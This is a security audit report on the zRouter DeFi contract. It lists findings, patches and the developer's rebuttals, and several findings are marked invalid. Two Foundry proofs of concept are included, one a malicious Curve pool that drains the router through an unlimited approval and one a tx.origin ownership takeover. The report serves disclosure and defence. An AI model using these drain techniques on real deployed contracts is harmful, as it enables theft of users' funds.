> **Non-issue — by design.** `sweep` is intentionally permissionless. The router is a stateless, atomic execution router that does not custody assets between transactions. `sweep` exists as a utility function for clearing residual dust within atomic multicall flows (e.g., sweeping output tokens to the recipient as the final step). There are no "router-held balances" to drain in normal operation — the router's balance at any point outside a transaction is zero (or negligible dust). The PoC artificially pre-funds the router via direct token transfers and `receive()`, which is not a realistic attack scenario. Anyone who sends tokens directly to the router outside of a multicall simply loses them.
>
> Similarly, `snwap`/`snwapMulti` with `amountIn == 0` is the intended deposit-then-swap pattern within a multicall. The `balanceOf(tokenIn)` at that point reflects tokens deposited in a prior subcall within the same atomic transaction, not persistent balances from other users.

---

# Untrusted pools gain unlimited approvals
**#9**
- Severity: Critical
- Validity: Acknowledged

## Targets
- swapCurve (zRouter)

## Affected Locations
- **zRouter.swapCurve**: Single finding location

## Description

Pool addresses in `route` are completely caller-controlled and are used directly in the swap loop. Before each swap, the router grants `type(uint256).max` allowance to the pool whenever the current allowance is zero. There is no whitelist or validation that the target is a legitimate Curve pool, so an attacker can supply a malicious contract. That contract can use the unlimited allowance to `transferFrom` the router for any amount of `inToken`, not just the intended `amount`, while returning a dust amount of output to satisfy the `outBalAfter > outBalBefore` check. The approval persists, enabling ongoing drains whenever the router holds that token.

## Root cause

User-supplied pool addresses are granted unlimited token approvals without validation or limiting allowance to the swap amount.

## Impact

A malicious pool can drain all balances of any token held by the router by abusing the unlimited approval. Once approved, the attacker can continue stealing that token in later transactions whenever the router receives it.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MaliciousCurvePool {
    MockERC20 public tokenIn;
    MockERC20 public tokenOut;
    address public attacker;

    constructor(address tokenIn_, address tokenOut_, address attacker_) {
        tokenIn = MockERC20(tokenIn_);
        tokenOut = MockERC20(tokenOut_);
        attacker = attacker_;
    }

    function exchange(int128, int128, uint256, uint256) external {
        address router = msg.sender;
        uint256 drainAmount = tokenIn.balanceOf(router);
        tokenIn.transferFrom(router, attacker, drainAmount);
        tokenOut.transfer(router, 1e18);
    }
}

contract ZRouterCurveApprovalTest is Test {
    function testUntrustedPoolDrainsRouterBalances() public {
        zRouter router = new zRouter();
        MockERC20 tokenIn = new MockERC20("TokenIn", "TIN");
        MockERC20 tokenOut = new MockERC20("TokenOut", "TOUT");

        address attacker = address(0xBEEF);
        address victim = address(0xCAFE);

        tokenIn.mint(victim, 1000e18);
        vm.prank(victim);
        tokenIn.transfer(address(router), 1000e18);

        tokenIn.mint(attacker, 10e18);

        MaliciousCurvePool pool = new MaliciousCurvePool(address(tokenIn), address(tokenOut), attacker);
        tokenOut.mint(address(pool), 1e18);

        address[11] memory route;
        route[0] = address(tokenIn);
        route[1] = address(pool);
        route[2] = address(tokenOut);

        uint256[4][5] memory swapParams;
        swapParams[0] = [uint256(0), uint256(1), uint256(1), uint256(10)];
        address[5] memory basePools;

        vm.startPrank(attacker);
        tokenIn.approve(address(router), 1e18);
        router.swapCurve(attacker, false, route, swapParams, basePools, 1e18, 0, block.timestamp + 1);
        vm.stopPrank();

        assertEq(tokenIn.balanceOf(address(router)), 0, "router drained");
        assertEq(tokenIn.balanceOf(attacker), 1010e18, "attacker stole router balance");
        assertEq(tokenOut.balanceOf(attacker), 1e18, "attacker received dust output");
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Set per-hop allowance for `swapCurve` by sizing approvals to the current `amount` and resetting to zero when needed so untrusted pools never receive unlimited approvals.

### Patch

```diff
diff --git a/src/zRouter.sol b/src/zRouter.sol
--- a/src/zRouter.sol
+++ b/src/zRouter.sol
@@ -547,8 +547,12 @@
 
                 // ---- lazy approve current input token for this pool (ERC20 only) ----
                 address inToken = _isETH(curIn) ? WETH : curIn;
-                if (allowance(inToken, address(this), pool) == 0) {
-                    safeApprove(inToken, pool, type(uint256).max);
+                uint256 currentAllowance = allowance(inToken, address(this), pool);
+                if (currentAllowance < amount) {
+                    if (currentAllowance != 0) {
+                        safeApprove(inToken, pool, 0);
+                    }
+                    safeApprove(inToken, pool, amount);
                 }
 
                 // track output balance before hop
```

### Affected Files

- `src/zRouter.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.34
Solc 0.8.34 finished in 5.95s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/zRouter.sol:1408:5:
     |
1408 |     function balanceOf(address owner, uint256 id) external view returns (uint256 amount);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/zRouter.sol:1377:1:
     |
1377 | function balanceOf(address token) view returns (uint256 amount) {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> test/ZRouter.t.sol:12:5:
   |
12 |     mapping(address => uint256) public balanceOf;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/zRouter.sol:1377:1:
     |
1377 | function balanceOf(address token) view returns (uint256 amount) {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> test/ZRouter.t.sol:13:5:
   |
13 |     mapping(address => mapping(address => uint256)) public allowance;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/zRouter.sol:1385:1:
     |
1385 | function allowance(address token, address owner, address spender) view returns (uint256 amount) {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/ZRouter.t.sol:ZRouterCurveApprovalTest
[FAIL: allowance] testUntrustedPoolDrainsRouterBalances() (gas: 6753877)
Traces:
  [6753877] ZRouterCurveApprovalTest::testUntrustedPoolDrainsRouterBalances()
    ├─ [5097000] → new zRouter@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [50505] → new SafeExecutor@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 252 bytes of code
    │   ├─ [43686] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::approve(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   ├─ [24800] 0x6ca84080381E43938476814be61B779A8bB6a600::approve(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─ emit Approval(from: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit OwnershipTransferred(from: 0x0000000000000000000000000000000000000000, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return] 24692 bytes of code
    ├─ [521588] → new MockERC20@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 2266 bytes of code
    ├─ [521588] → new MockERC20@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 2266 bytes of code
    ├─ [44697] MockERC20::mint(0x000000000000000000000000000000000000cafE, 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000cafE)
    │   └─ ← [Return]
    ├─ [22953] MockERC20::transfer(zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [22797] MockERC20::mint(0x000000000000000000000000000000000000bEEF, 10000000000000000000 [1e19])
    │   └─ ← [Stop]
    ├─ [274086] → new MaliciousCurvePool@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
    │   └─ ← [Return] 1035 bytes of code
    ├─ [44697] MockERC20::mint(MaliciousCurvePool: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000 [1e18])
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [22465] MockERC20::approve(zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
    │   └─ ← [Return] true
    ├─ [33292] zRouter::swapCurve(0x000000000000000000000000000000000000bEEF, false, [0x2e234DAe75C793f67A35089C9d99245E1C58470b, 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9, 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000], [[0, 1, 1, 10], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]], [0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000], 1000000000000000000 [1e18], 0, 1772300664 [1.772e9])
    │   ├─ [1560] MockERC20::transferFrom(0x000000000000000000000000000000000000bEEF, zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [2697] MockERC20::allowance(zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], MaliciousCurvePool: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [20365] MockERC20::approve(MaliciousCurvePool: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000 [1e18])
    │   │   └─ ← [Return] true
    │   ├─ [2503] MockERC20::balanceOf(zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2245] MaliciousCurvePool::exchange(0, 1, 1000000000000000000 [1e18], 0)
    │   │   ├─ [503] MockERC20::balanceOf(zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 1001000000000000000000 [1.001e21]
    │   │   ├─ [659] MockERC20::transferFrom(zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x000000000000000000000000000000000000bEEF, 1001000000000000000000 [1.001e21])
    │   │   │   └─ ← [Revert] allowance
    │   │   └─ ← [Revert] allowance
    │   └─ ← [Revert] allowance
    └─ ← [Revert] allowance

Backtrace:
  at MockERC20.transferFrom
  at MaliciousCurvePool.exchange
  at zRouter.swapCurve
  at ZRouterCurveApprovalTest.testUntrustedPoolDrainsRouterBalances

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.55s (1.90s CPU time)

Ran 1 test suite in 3.75s (2.55s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ZRouter.t.sol:ZRouterCurveApprovalTest
[FAIL: allowance] testUntrustedPoolDrainsRouterBalances() (gas: 6753877)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

> ### Response
> **Acknowledged — UI/frontend concern, not a contract vulnerability.** The lazy max approval to caller-supplied pool addresses follows the same pattern used by the official Curve Router. The router is stateless and does not hold persistent token balances, so the approval cannot be exploited by a third party in practice — the router's token balance is zero outside of atomic transactions. The responsibility for validating pool addresses lies with the frontend/UI layer, which constructs the route and swap parameters. A malicious pool address in the route would only affect the caller's own transaction. This is consistent with how other DEX aggregators and the official Curve router handle pool approvals.

---

# Unvalidated pool manager swap target
**#10**
- Severity: Critical
- Validity: Invalid

## Targets
- _swap (zRouter)

## Affected Locations
- **zRouter._swap**: Single finding location

## Description

The `_swap` helper assumes that `msg.sender` is a trusted V4 pool manager and directly calls `IV4PoolManager(msg.sender).swap` without any validation. This helper is reached from `unlockCallback`, which is an external callback that finalizes settlement, so the caller controls `msg.sender` unless the callback explicitly restricts it. A malicious contract that can invoke the callback will be treated as the pool manager and can return an arbitrary `delta` without executing a real swap. The callback then settles based on this untrusted delta, effectively letting the attacker dictate how much the router should pay or credit. This breaks the settlement invariant and turns the router into a fund-transfer primitive when it holds pooled balances.

## Root cause

The function uses `msg.sender` as the pool manager address for an external call without verifying it is an authorized V4 manager for this router.

## Impact

An attacker who can trigger the callback path can impersonate a pool manager and supply arbitrary swap results. This can cause the router to transfer tokens it holds or corrupt its internal balance accounting based on fabricated deltas.

## Remediation

**Status:** Incomplete

### Explanation

Use the router’s configured/immutable PoolManager address for swaps and callbacks instead of `msg.sender`, and add a strict check that `msg.sender` equals this authorized manager before accepting any callback data or deltas. Reject calls from any other address to prevent fabricated swap results from affecting balances or transfers.

> ### Response
> **Non-issue — already validated.** `unlockCallback` already contains `require(msg.sender == V4_POOL_MANAGER, Unauthorized())` at its entry point (line 242), which strictly validates that only the immutable V4 Pool Manager can invoke the callback. The `_swap` helper is an internal function only reachable from within `unlockCallback`, which has already authenticated the caller. No external actor can invoke `_swap` or `unlockCallback` with a fabricated pool manager address.

---

# Permit2 deposits credited to router
**#11**
- Severity: Critical
- Validity: Invalid

## Targets
- permit2TransferFrom (zRouter)

## Affected Locations
- **zRouter.permit2TransferFrom**: Single finding location

## Description

The function uses Permit2 to transfer `amount` of `token` from the caller into the router, so the caller is the party funding the deposit. It then calls `depositFor(token, 0, amount, address(this))`, which, given the router’s per-user deposit bookkeeping, credits the supplied address in the internal balance mapping. Passing `address(this)` therefore increases the router’s own balance while leaving the caller’s balance unchanged. Any subsequent withdrawals or swaps that rely on the caller’s internal balance will see zero and revert or skip, leaving the transferred tokens stranded under the router’s account. Those tokens can only be moved through privileged paths that operate on the router’s balance, not by the original user, resulting in loss of user funds.

## Root cause

`depositFor` is invoked with `address(this)` instead of the caller, mis-attributing the deposit to the router rather than the token owner.

## Impact

Callers who rely on this helper lose access to their tokens because their internal balance is never credited. The funds become stuck under the router’s account and can only be moved by privileged logic that spends the router’s own balance, effectively trapping user deposits.

## Remediation

**Status:** Incomplete

### Explanation

Modify `permit2TransferFrom` to credit the transferred tokens to the actual owner (e.g., `msg.sender` or the `from` address) by passing that address into `depositFor`, and ensure any owner parameter is validated against the permit/signature so deposits cannot be misattributed to the router.

> ### Response
> **Non-issue — misunderstanding of transient storage design.** `depositFor(token, 0, amount, address(this))` crediting `address(this)` is intentional. The transient storage balance keyed to `address(this)` acts as a shared transient pool for the current multicall transaction. Subsequent swap functions (swapV2, swapV3, etc.) call `_useTransientBalance(address(this), tokenIn, ...)` to consume these credits. This is the same pattern used by `deposit()` — all deposit functions credit `address(this)` because the router itself is the intermediary that holds and routes tokens within the atomic transaction. The user's tokens are not "stranded" — they are consumed by the next swap operation in the multicall batch.

---

# Inverted stETH ratio undercharges ETH
**#13**
- Severity: Critical
- Validity: Invalid

## Targets
- ethToExactWSTETH (zRouter)

## Affected Locations
- **zRouter.ethToExactWSTETH**: Single finding location

## Description

The function queries `getTotalPooledEther()` and `getTotalShares()` from stETH but uses them in the wrong order when computing `ethIn`. It calculates `ethIn` as `ceil(exactOut * totalShares / totalPooledEther)`, while stETH mints shares as `eth * totalShares / totalPooledEther`, so the ETH needed for `exactOut` shares is the inverse ratio. Under normal conditions where total pooled ether exceeds total shares, this underestimates the ETH required and mints fewer wstETH than `exactOut`. The router then transfers `exactOut` wstETH anyway, consuming any pre-existing wstETH held by the router to cover the shortfall. This lets callers buy wstETH at a discount and drain any wstETH the router holds; if no balance exists, the function simply reverts, making the conversion path unusable.

## Root cause

The conversion formula swaps the numerator and denominator of the stETH share price, using `totalShares / totalPooledEther` instead of `totalPooledEther / totalShares` when computing the ETH required for a target share amount.

## Impact

An attacker can obtain more wstETH than their ETH deposit should mint, siphoning the difference from the router’s existing wstETH holdings. This can deplete user or protocol-held wstETH balances. If the router has no wstETH inventory, the function reverts and users cannot perform ETH→wstETH conversions through this path.

## Remediation

**Status:** Incomplete

### Explanation

Use the correct stETH share price when computing the ETH needed for a target wstETH amount by applying `totalPooledEther / totalShares` (or Lido’s `getPooledEthByShares` helper) instead of the inverted ratio, so the router charges the full ETH cost and cannot subsidize mints from its inventory.

> ### Response
> **Non-issue — ratio is correct.** The function computes `ethIn = ceil(exactOut * totalPooledEther / totalShares)`. Lido mints shares as `shares = eth * totalShares / totalPooledEther`, so to get `exactOut` shares (wstETH wraps shares), the required ETH is `ethIn = exactOut * totalPooledEther / totalShares` — which is exactly what the code computes. The V12 auditor has the numerator and denominator confused in its analysis. The function is deployed and correctly converts ETH to exact wstETH amounts on mainnet.

---

# Dirty address from CREATE2 hash
**#12**
- Severity: High
- Validity: Invalid

## Targets
- _computeV3pool (zRouter)

## Affected Locations
- **zRouter._computeV3pool**: Single finding location

## Description

`_computeV3pool` builds the CREATE2 preimage in assembly and assigns the full `keccak256` result directly to the `address` return variable. The CREATE2 formula yields a 32‑byte hash, but a pool address is defined as the lower 20 bytes, so the upper 96 bits must be discarded. Because no truncation is applied, the function returns a non‑canonical address with dirty upper bits. The fallback V3 swap callback path uses `_v3PoolFor`/`_computeV3pool` to derive the expected pool and compare it against `msg.sender` for authentication. That comparison will fail for real pools, causing legitimate swap callbacks to revert and breaking V3 routing.

## Root cause

The assembly assigns the 32‑byte `keccak256` output to an `address` without masking it to 160 bits.

## Impact

Any swap routed through V3 pools can revert during callback validation, preventing users from executing those swaps through the router. An attacker can repeatedly trigger V3 paths to consistently fail, effectively denying access to V3 liquidity via this router.

## Remediation

**Status:** Incomplete

### Explanation

Mask the CREATE2 hash to 160 bits when casting to `address` by applying `and(hash, 0x000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)` (or using `address(uint160(uint256(hash)))` outside assembly) so the computed pool address is clean and matches the actual V3 pool.

> ### Response
> **Non-issue — Solidity compiler handles address cleanup.** When a `keccak256` result is assigned to a variable of type `address` in inline assembly and subsequently used in Solidity-level comparisons or ABI encoding, the Solidity compiler (0.8.x+) automatically inserts address cleanup code (`and(val, 0xffffffffffffffffffffffffffffffffffffffff)`) at the point of use. The `_computeV3pool` function returns `address v3pool`, and any comparison (e.g., `computedPool == msg.sender` in the V3 callback authentication) is performed in Solidity context where both operands are cleaned. The router is deployed on mainnet and successfully routes V3 swaps, confirming the pool address computation is correct.

---

# Fee-on-transfer deposits overcredited
**#5**
- Severity: Low
- Validity: Acknowledged

## Targets
- permit2BatchTransferFrom (zRouter)

## Affected Locations
- **zRouter.permit2BatchTransferFrom**: Single finding location

## Description

The function transfers tokens into the router via `PERMIT2` and then immediately credits deposits by calling `depositFor` with the nominal `permitted[i].amount`. This assumes the router received the full amount specified in the permit, but fee-on-transfer or deflationary tokens can reduce the amount actually received. Because no balance-delta check is performed between the `permitBatchTransferFrom` call and `depositFor`, the router’s internal deposit accounting can be inflated for these tokens. The resulting mismatch lets a user claim more balance than the router actually holds, which can be exploited in later withdrawals or swaps. The bug arises from trusting user-supplied amounts rather than reconciling the actual tokens received.

## Root cause

`permit2BatchTransferFrom` passes the signed `permitted[i].amount` directly into `depositFor` without reconciling the contract’s actual balance increase after the transfer.

## Impact

An attacker can deposit a fee-on-transfer token and be credited for more than the router received, then withdraw or swap against this inflated balance. If other users have deposited the same token, the attacker can siphon the shortfall from their pooled funds. Even without draining, the router can become insolvent for that token, breaking future withdrawals or swaps.

> ### Response
> **Acknowledged — accepted risk.** Fee-on-transfer tokens are a known edge case. The router is designed for standard ERC20 tokens and does not claim to support deflationary/fee-on-transfer tokens. The transient storage accounting assumes 1:1 transfer amounts, which is correct for all standard tokens. Users routing fee-on-transfer tokens through the router may experience slippage or reverts, but this is a property of those non-standard tokens, not a vulnerability in the router. The frontend/UI layer can warn users about fee-on-transfer tokens. This is consistent with how Uniswap's Universal Router and other aggregators handle this class of tokens.

---

# Ownership set via tx.origin
**#6**
- Severity: Low
- Validity: Invalid

## Targets
- constructor (zRouter)

## Affected Locations
- **zRouter.constructor**: Single finding location

## Description

The constructor assigns `_owner` using `tx.origin` rather than `msg.sender` or an explicit parameter. If the router is deployed through a factory, multisig, or other contract, `tx.origin` will be the externally owned account that initiated the deployment transaction, not the deploying contract. This means the EOA becomes the owner even when the intended owner is the deploying contract, bypassing its access controls. Because privileged functions elsewhere in the router are gated by `_owner` (including the trusted execution facility mentioned in the contract summary), that EOA can call those functions directly without the intended governance. The misassignment occurs at deployment time and cannot be corrected without redeploying the router.

## Root cause

The constructor uses `tx.origin` to set `_owner`, which breaks ownership when deployment is performed by an intermediate contract.

## Impact

An EOA that submits the deployment transaction can become the sole owner even when a factory or multisig was meant to control the router. This grants that EOA unrestricted access to owner-only operations and the trusted execution facility, enabling arbitrary call execution or fund movement that should have required governance approval.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

contract RouterFactory {
    zRouter public router;

    function deployRouter() external returns (zRouter) {
        router = new zRouter();
        return router;
    }

    function trustFromFactory(address target, bool ok) external {
        router.trust(target, ok);
    }
}

contract ZRouterTxOriginOwnerTest is Test {
    function testTxOriginOwnerMisassignmentLetsEOAControlRouter() public {
        address attacker = address(0xBEEF);
        RouterFactory factory = new RouterFactory();

        // Attacker triggers deployment through a factory with tx.origin = attacker.
        vm.startPrank(attacker, attacker);
        zRouter router = factory.deployRouter();
        vm.stopPrank();

        // Factory intended to manage the router but cannot call onlyOwner functions.
        vm.expectRevert(zRouter.Unauthorized.selector);
        factory.trustFromFactory(attacker, true);

        // Attacker (tx.origin) becomes owner and can whitelist arbitrary targets.
        vm.prank(attacker);
        router.trust(attacker, true);

        // Fund the router and show attacker can drain via trusted execution.
        vm.deal(address(router), 1 ether);
        uint256 attackerBalBefore = attacker.balance;

        vm.prank(attacker);
        router.execute(attacker, 1 ether, "");

        assertEq(attacker.balance, attackerBalBefore + 1 ether);
    }
}
```

## Remediation

**Status:** Error

### Explanation

Set the initial owner from `msg.sender` or an explicit constructor parameter and remove any use of `tx.origin`, so ownership is assigned to the deploying contract/multisig as intended rather than the EOA that submitted the transaction.

### Error

Error code: 400 - {'error': {'message': 'Your input exceeds the context window of this model. Please adjust your input and try again.', 'type': 'invalid_request_error', 'param': 'input', 'code': 'context_length_exceeded'}}

> ### Response
> **Non-issue — intentional design.** Using `tx.origin` in the constructor is a deliberate choice. The router is deployed directly by the owner EOA, not through factories or multisigs. The `transferOwnership` function exists to transfer ownership post-deployment if needed. The PoC scenario of deploying through a factory is not the intended deployment pattern. The deployer EOA being the initial owner is the correct and expected behavior.